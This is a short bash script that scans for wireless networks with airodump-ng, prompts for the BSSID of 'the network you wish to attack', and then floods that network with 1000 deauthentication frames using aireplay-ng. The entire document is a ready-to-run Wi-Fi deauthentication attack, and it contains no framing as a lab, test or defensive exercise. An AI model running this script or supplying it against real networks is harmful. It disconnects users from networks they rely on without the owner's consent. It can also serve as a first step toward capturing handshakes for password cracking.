#! /bin/bash

echo "A scan will begin, Please enter your Wireless Interface: "
read int
sudo airodump-ng $int
echo "Please enter the BSSID of the network you wish to attack: "
read BSSID
sudo aireplay-ng --deauth 1000 -a $BSSID $int
